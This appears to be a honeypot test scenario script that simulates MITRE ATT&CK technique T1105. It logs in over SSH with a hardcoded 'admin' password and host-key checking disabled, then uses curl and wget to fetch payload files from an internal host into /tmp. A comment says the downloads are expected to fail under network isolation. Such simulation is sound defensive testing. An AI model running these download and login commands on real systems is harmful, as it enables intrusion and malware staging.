#!/usr/bin/env bash
# S25 — Remote File Download Attempt
# Tactic : Command and Control (TA0011)
# Technique: T1105 Ingress Tool Transfer
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S25 Remote File Download — ${TARGET} ==="
$SSH "curl -s --max-time 5 http://10.0.0.99/payload -o /tmp/payload 2>&1 || echo 'curl failed'; wget -q --timeout=5 http://10.0.0.99/payload2 -O /tmp/payload2 2>&1 || echo 'wget failed'; ls /tmp/payload* 2>/dev/null || echo 'no files downloaded (network isolated — expected)'" && echo "[OK]" || echo "[FAIL]"
